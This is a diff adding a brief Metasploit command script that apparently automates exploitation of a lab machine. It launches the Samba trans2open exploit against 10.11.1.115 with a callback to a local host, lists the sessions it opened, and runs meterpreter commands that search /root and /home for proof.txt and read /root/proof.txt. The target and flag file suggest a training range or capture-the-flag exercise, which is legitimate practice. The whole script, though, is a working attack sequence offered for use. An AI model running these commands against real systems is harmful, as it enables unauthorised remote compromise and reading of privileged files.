@@ -1,0 +1,9 @@
+exploit/linux/samba/trans2open; set delay_to_observe 60; set rhosts 10.11.1.115; set LHOST <LOCAL_IP>; set extra_metasploit_sleep 30; run;
+
+sessions;
+
+execute_meterpretershell_command_in_session; set command find /root -name proof.txt 2>/dev/null; run;
+
+execute_meterpretershell_command_in_session; set command find /home -name proof.txt 2>/dev/null; run;
+
+execute_meterpretershell_command_in_session; set command cat /root/proof.txt 2>/dev/null; run;
